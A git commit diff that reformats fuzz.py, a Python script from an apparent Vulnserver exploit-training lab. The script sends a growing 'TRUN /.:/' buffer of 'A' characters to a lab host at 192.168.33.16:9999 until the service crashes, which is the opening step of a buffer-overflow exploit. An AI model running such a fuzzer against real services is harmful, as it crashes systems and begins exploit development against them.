925af93ffbb5dc20c6ed1862b17afdcd865a4499
Henry Post <henryfbp@gmail.com>
2020-04-07 13:01:22 -0500

    format fuzz.py

--- vagrant/kali/shared/Projects/vulnserver/fuzz.py
+++ vagrant/kali/shared/Projects/vulnserver/fuzz.py
@@ -3,22 +3,22 @@
 import sys, socket
 from time import sleep
 
-buffer = 'A'*100
+buffer = 'A' * 100
 
 while True:
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect(('192.168.33.16', 9999))
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.33.16', 9999))
 
-		cmd=('TRUN /.:/' + buffer)
-		# print("SEND "+cmd)
-		s.send(cmd)
-		print("sent %d bytes" % len(buffer))
-		s.close()
-		sleep(1)
+        cmd = ('TRUN /.:/' + buffer)
+        # print("SEND "+cmd)
+        s.send(cmd)
+        print("sent %d bytes" % len(buffer))
+        s.close()
+        sleep(1)
 
-		buffer=buffer+("A"*100)
-	except:
-		print("crashed at %d bytes" % len(buffer))
-		# print(e)
-		sys.exit()
+        buffer = buffer + ("A" * 100)
+    except:
+        print("crashed at %d bytes" % len(buffer))
+        # print(e)
+        sys.exit()
